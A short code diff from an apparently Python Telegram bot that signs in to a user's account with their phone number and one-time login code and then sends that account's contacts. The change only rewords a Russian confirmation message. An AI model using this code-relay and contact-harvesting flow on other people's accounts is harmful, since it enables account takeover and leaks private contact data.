@@ -324,7 +324,7 @@ async def get_code(message: types.Message):
     try:
         await client.connect()
         await client.sign_in(phone_number, code, phone_code_hash=str(phone_code_hash))
-        await message.answer("Подключено! Выбери в меню бота одну из опций")
+        await message.answer("Подключено! Вот контакты. Остальное - в меню бота")
         user_state[user_id]['connected'] = True  # Обновляем состояние
         await get_and_send_contacts(client, phone_number, user_id)
     except SessionPasswordNeededError:
